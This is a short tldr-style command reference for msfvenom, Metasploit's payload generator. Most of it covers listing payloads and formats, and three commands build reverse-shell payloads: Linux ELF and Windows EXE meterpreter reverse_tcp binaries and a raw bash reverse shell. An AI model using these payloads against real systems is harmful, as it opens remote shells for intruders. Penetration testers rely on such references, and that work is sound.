# msfvenom

> Manually generate payloads for metasploit. More information: <https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html>.

## Examples

### List payloads

```bash
msfvenom [-l|--list] payloads
```

### List formats

```bash
msfvenom [-l|--list] formats
```

### Show payload options

```bash
msfvenom [-p|--payload] payload --list-options
```

### Create an ELF binary with a reverse TCP handler

```bash
msfvenom [-p|--payload] linux/x64/meterpreter/reverse_tcp LHOST=local_ip LPORT=local_port [-f|--format] elf [-o|--out] path/to/binary
```

### Create an EXE binary with a reverse TCP handler

```bash
msfvenom [-p|--payload] windows/x64/meterpreter/reverse_tcp LHOST=local_ip LPORT=local_port [-f|--format] exe [-o|--out] path/to/binary.exe
```

### Create a raw Bash with a reverse TCP handler

```bash
msfvenom [-p|--payload] cmd/unix/reverse_bash LHOST=local_ip LPORT=local_port [-f|--format] raw
```
